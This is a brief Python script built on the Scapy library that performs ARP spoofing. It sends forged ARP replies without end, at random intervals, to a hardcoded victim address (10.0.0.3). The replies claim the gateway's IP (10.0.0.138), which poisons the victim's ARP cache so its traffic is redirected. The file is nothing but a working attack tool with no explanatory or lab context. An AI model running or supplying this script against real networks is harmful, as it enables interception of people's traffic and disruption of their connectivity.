
from scapy.all import sendp, Ether, ARP, RandNum



gateway_ip = "10.0.0.138"
gateway_mac = "00:b8:c2:bc:2a:62"

victim_ip = "10.0.0.3"
victim_mac = "11:22:33:44:55:66"

sendp(Ether(dst=victim_mac) / ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip),
      inter=RandNum(10,40), loop=1 )